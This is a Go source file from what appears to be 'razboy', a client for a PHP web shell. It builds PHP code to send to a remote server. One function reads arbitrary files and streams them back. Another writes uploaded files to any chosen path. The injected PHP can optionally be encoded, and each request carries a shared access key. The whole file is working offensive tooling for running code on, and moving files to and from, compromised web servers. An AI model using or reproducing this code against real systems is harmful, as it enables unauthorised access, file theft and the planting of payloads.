package php

import (
	"bytes"
	"io"
	"mime/multipart"
	"os"
	"path/filepath"

	"github.com/eatbytes/razboy/core"
	"github.com/eatbytes/razboy/ferror"
	"github.com/eatbytes/razboy/normalizer"
)

const KEY = "RAZBOYNIK_KEY"

type PHP struct {
	config *core.Config
}

func Create(config *core.Config) *PHP {
	return &PHP{
		config: config,
	}
}

func buildHeader(dir string) string {
	var headers [8]string
	var str string

	headers[0] = "header('Content-Description: File Transfer');"
	headers[1] = "header('Content-Type: application/octet-stream');"
	headers[2] = "header('Content-Disposition: attachment; filename='.basename('" + dir + "'));"
	headers[3] = "header('Content-Transfer-Encoding: binary');"
	headers[4] = "header('Expires: 0');"
	headers[5] = "header('Cache-Control: must-revalidate, post-check=0, pre-check=0');"
	headers[6] = "header('Pragma: public');"
	headers[7] = "header('Content-Length: ' . filesize('" + dir + "'));"

	for _, header := range headers {
		str = str + header
	}

	return str
}

func (php *PHP) Download(dir string) string {
	var c1, c2, headers, ob string

	c1 = "if (file_exists('" + dir + "')) {"
	c2 = "}"
	headers = buildHeader(dir)
	ob = "ob_clean();flush();readfile('" + dir + "');exit();"

	return c1 + headers + ob + c2
}

func (php *PHP) Upload(path, dir string) (*bytes.Buffer, string, error) {
	var phpR string

	phpR = "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');if(file_exists('" + dir + "')){echo 1;}"

	if !php.config.Raw {
		phpR = normalizer.Encode(phpR)
	}

	file, err := os.Open(path)
	if err != nil {
		return nil, "", ferror.FileErr(err)
	}

	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(path))

	if err != nil {
		return nil, "", ferror.PartErr(err)
	}

	_, err = io.Copy(part, file)

	writer.WriteField(php.config.Parameter, phpR)

	if php.config.Key != "" {
		writer.WriteField(KEY, php.config.Key)
	}

	err = writer.Close()
	if err != nil {
		return nil, "", ferror.FileErr(err)
	}

	return body, writer.FormDataContentType(), nil
}
